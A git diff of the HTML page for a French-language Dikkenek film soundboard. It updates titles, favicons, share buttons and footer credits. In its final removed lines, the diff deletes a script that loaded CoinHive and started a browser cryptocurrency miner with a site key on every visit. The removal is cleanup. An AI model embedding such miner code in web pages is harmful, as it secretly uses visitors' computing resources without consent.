@@ -5,27 +5,28 @@
     <meta charset="utf-8">
     <meta name="description" content="Soundboard adapté du film Dikkenek.">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta property="og:title"
-          content="Dikkenek le Soundboard"/>
-    <meta property="og:image"
-          content="img/claudy.jpg"/>
-    <meta property="og:site_name" content="Dikkenek le Soundboard"/>
-    <meta name="og:description"
-          content="Soundboard adapté du film Dikkenek.">
+    <meta property="og:title" content="Dikkenek, le soundboard"/>
+    <meta property="og:image" content="img/claudy.jpg"/>
+    <meta property="og:site_name" content="Dikkenek, le soundboard"/>
+    <meta name="og:description" content="Soundboard adapté du film Dikkenek.">
     <meta property="og:locale:alternate" content="fr_FR"/>
-    <title>Dikkenek le Soundboard</title>
-    <link href='//fonts.googleapis.com/css?family=Montserrat:400,700'
-          rel='stylesheet' type='text/css'>
+    <title>Dikkenek, le soundboard</title>
+    <link href='//fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
     <link rel="stylesheet" href="css/style.css"/>
     <script src="js/jquery.js"></script>
     <script src="js/modernizr.js"></script>
     <script src="js/mousetrap.js"></script>
     <script src="js/app.js"></script>
+    <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
+    <link rel="manifest" href="images/site.webmanifest">
+    <link rel="shortcut icon" href="images/favicon.ico">
   </head>
   <body class="page-content">
     <header class="page-title">
       <img src="img/claudy.jpg" alt="Claudy"/>
-      <h1>Dikkenek le Soundboard</h1>
+      <h1>Dikkenek, le soundboard</h1>
     </header>
     <h2 class="ofc keyboard">
       Appuie sur la touche de ton clavier pour entendre la phrase.
@@ -34,9 +35,46 @@
     </h2>
     <h2 class="ofc finger">Appuie sur une des phrases pour l'entendre.</h2>
     <div class="social-network">
-      <div class="fb-share-button" data-href="http://dikkenek.soundboard.club" data-layout="button_count"></div>
-      <a href="https://twitter.com/share" class="twitter-share-button" data-url="http://dikkenek.soundboard.club" data-hashtags="dikkeneklesoundboard,soundboardclub">Tweet</a>
-      <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+        <!-- Sharingbutton Facebook -->
+        <a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgit.io%2FJPgjh" target="_blank" rel="noopener" aria-label="Partager sur Facebook">
+          <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--large"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z"/></svg>
+            </div>Partager sur Facebook</div>
+        </a>
+
+        <!-- Sharingbutton Twitter -->
+        <a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?text=Dikkenek%2C%20le%20soundboard%20%23dikkeneklesoundboard&amp;url=https%3A%2F%2Fgit.io%2FJPgjh" target="_blank" rel="noopener" aria-label="Partager sur Twitter">
+          <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--large"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M23.44 4.83c-.8.37-1.5.38-2.22.02.93-.56.98-.96 1.32-2.02-.88.52-1.86.9-2.9 1.1-.82-.88-2-1.43-3.3-1.43-2.5 0-4.55 2.04-4.55 4.54 0 .36.03.7.1 1.04-3.77-.2-7.12-2-9.36-4.75-.4.67-.6 1.45-.6 2.3 0 1.56.8 2.95 2 3.77-.74-.03-1.44-.23-2.05-.57v.06c0 2.2 1.56 4.03 3.64 4.44-.67.2-1.37.2-2.06.08.58 1.8 2.26 3.12 4.25 3.16C5.78 18.1 3.37 18.74 1 18.46c2 1.3 4.4 2.04 6.97 2.04 8.35 0 12.92-6.92 12.92-12.93 0-.2 0-.4-.02-.6.9-.63 1.96-1.22 2.56-2.14z"/></svg>
+            </div>Partager sur Twitter</div>
+        </a>
+
+        <!-- Sharingbutton E-Mail -->
+        <a class="resp-sharing-button__link" href="mailto:?subject=Dikkenek%2C%20le%20soundboard%20%23dikkeneklesoundboard&amp;body=https%3A%2F%2Fgit.io%2FJPgjh" target="_self" rel="noopener" aria-label="Share by E-Mail">
+          <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--large"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22 4H2C.9 4 0 4.9 0 6v12c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM7.25 14.43l-3.5 2c-.08.05-.17.07-.25.07-.17 0-.34-.1-.43-.25-.14-.24-.06-.55.18-.68l3.5-2c.24-.14.55-.06.68.18.14.24.06.55-.18.68zm4.75.07c-.1 0-.2-.03-.27-.08l-8.5-5.5c-.23-.15-.3-.46-.15-.7.15-.22.46-.3.7-.14L12 13.4l8.23-5.32c.23-.15.54-.08.7.15.14.23.07.54-.16.7l-8.5 5.5c-.08.04-.17.07-.27.07zm8.93 1.75c-.1.16-.26.25-.43.25-.08 0-.17-.02-.25-.07l-3.5-2c-.24-.13-.32-.44-.18-.68s.44-.32.68-.18l3.5 2c.24.13.32.44.18.68z"/></svg></div>Share by E-Mail</div>
+        </a>
+
+        <!-- Sharingbutton LinkedIn -->
+        <a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fgit.io%2FJPgjh&amp;title=Dikkenek%2C%20le%20soundboard%20%23dikkeneklesoundboard&amp;summary=Dikkenek%2C%20le%20soundboard%20%23dikkeneklesoundboard&amp;source=https%3A%2F%2Fgit.io%2FJPgjh" target="_blank" rel="noopener" aria-label="Partager sur LinkedIn">
+          <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--large"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 21.5h-5v-13h5v13zM4 6.5C2.5 6.5 1.5 5.3 1.5 4s1-2.4 2.5-2.4c1.6 0 2.5 1 2.6 2.5 0 1.4-1 2.5-2.6 2.5zm11.5 6c-1 0-2 1-2 2v7h-5v-13h5V10s1.6-1.5 4-1.5c3 0 5 2.2 5 6.3v6.7h-5v-7c0-1-1-2-2-2z"/></svg>
+            </div>Partager sur LinkedIn</div>
+        </a>
+
+        <!-- Sharingbutton WhatsApp -->
+        <a class="resp-sharing-button__link" href="whatsapp://send?text=Dikkenek%2C%20le%20soundboard%20%23dikkeneklesoundboard%20https%3A%2F%2Fgit.io%2FJPgjh" target="_blank" rel="noopener" aria-label="Partager sur WhatsApp">
+          <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--large"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.1 3.9C17.9 1.7 15 .5 12 .5 5.8.5.7 5.6.7 11.9c0 2 .5 3.9 1.5 5.6L.6 23.4l6-1.6c1.6.9 3.5 1.3 5.4 1.3 6.3 0 11.4-5.1 11.4-11.4-.1-2.8-1.2-5.7-3.3-7.8zM12 21.4c-1.7 0-3.3-.5-4.8-1.3l-.4-.2-3.5 1 1-3.4L4 17c-1-1.5-1.4-3.2-1.4-5.1 0-5.2 4.2-9.4 9.4-9.4 2.5 0 4.9 1 6.7 2.8 1.8 1.8 2.8 4.2 2.8 6.7-.1 5.2-4.3 9.4-9.5 9.4zm5.1-7.1c-.3-.1-1.7-.9-1.9-1-.3-.1-.5-.1-.7.1-.2.3-.8 1-.9 1.1-.2.2-.3.2-.6.1s-1.2-.5-2.3-1.4c-.9-.8-1.4-1.7-1.6-2-.2-.3 0-.5.1-.6s.3-.3.4-.5c.2-.1.3-.3.4-.5.1-.2 0-.4 0-.5C10 9 9.3 7.6 9 7c-.1-.4-.4-.3-.5-.3h-.6s-.4.1-.7.3c-.3.3-1 1-1 2.4s1 2.8 1.1 3c.1.2 2 3.1 4.9 4.3.7.3 1.2.5 1.6.6.7.2 1.3.2 1.8.1.6-.1 1.7-.7 1.9-1.3.2-.7.2-1.2.2-1.3-.1-.3-.3-.4-.6-.5z"/></svg>
+            </div>Partager sur WhatsApp</div>
+        </a>
+
+        <!-- Sharingbutton Telegram -->
+        <a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Dikkenek%2C%20le%20soundboard%20%23dikkeneklesoundboard&amp;url=https%3A%2F%2Fgit.io%2FJPgjh" target="_blank" rel="noopener" aria-label="Partager sur Telegram">
+          <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--large"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M.707 8.475C.275 8.64 0 9.508 0 9.508s.284.867.718 1.03l5.09 1.897 1.986 6.38a1.102 1.102 0 0 0 1.75.527l2.96-2.41a.405.405 0 0 1 .494-.013l5.34 3.87a1.1 1.1 0 0 0 1.046.135 1.1 1.1 0 0 0 .682-.803l3.91-18.795A1.102 1.102 0 0 0 22.5.075L.706 8.475z"/></svg>
+            </div>Partager sur Telegram</div>
+        </a>
     </div>
     <ul class="words">
       <li data-sound="achever_50e" data-keyboard="true" data-key="a">
@@ -233,7 +271,7 @@
       </li>
       <li data-sound="he_ket">
         <strong>&nbsp;</strong>
-        <span class="words-text">Hé ket!</span>
+        <span class="words-text">Hé ket !</span>
       </li>
       <li data-sound="iad">
         <strong>&nbsp;</strong>
@@ -525,30 +563,20 @@
       </li>
     </ul>
     <footer class="site-footer">
+      Réssucité dans la nuit du 30 octobre 2021 par <a target="_blank" href="https://twitter.com/MehdiChch" title="@MehdiChch">@MehdiChch</a>.
+      <br>
       Confectionné autour d'une bonne fricadelle et de vedetts par
-      <a target="_blank" href="https://twitter.com/henrottesimon" title="@henrottesimon">@henrottesimon</a>
-      et
+      <a target="_blank" href="https://twitter.com/henrottesimon" title="@henrottesimon">@henrottesimon</a> et
       <a target="_blank" href="https://twitter.com/kevinvzb" title="@kevinvzb">@kevinvzb</a>.
       <br>
-      Merci à <a target="_blank" href="https://twitter.com/chteuchteu" title="@chteuchteu">@chteuchteu</a> et <a target="_blank" href="https://twitter.com/Jakon67" title="@Jakon67">@Jakon67</a> pour la première version des sons.
+      Merci à <a target="_blank" href="https://twitter.com/chteuchteu" title="@chteuchteu">@chteuchteu</a> et
+      <a target="_blank" href="https://twitter.com/Jakon67" title="@Jakon67">@Jakon67</a> pour la première version des sons.
       <div class="network">
-        Découvrez les autres soundboards sur
-         <a href="//soundboard.club" target="_blank">soundboard.club</a>.
+        Découvrez les autres soundboards sur <a href="https://git.io/JPWLi" target="_blank">git.io/jpwli</a>.
+      </div>
+      <div class="contributing">
+        Pour ajouter des sons <a href="https://git.io/JP2eN" target="_blank">git.io/JP2eN</a>.
       </div>
     </footer>
-    <script src="js/ga.js"></script>
-    <div id="fb-root"></div>
-    <script>(function(d, s, id) {
-      var js, fjs = d.getElementsByTagName(s)[0];
-      if (d.getElementById(id)) return;
-      js = d.createElement(s); js.id = id;
-      js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3&appId=135141406674182";
-      fjs.parentNode.insertBefore(js, fjs);
-    }(document, 'script', 'facebook-jssdk'));</script>
-    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <script>
-      var miner = new CoinHive.User('Ta3RSvcEohVLcaaJ576RwvMnE3gjMjEw', 'dikkenek-soundboard');
-      miner.start();
-    </script>
   </body>
 </html>
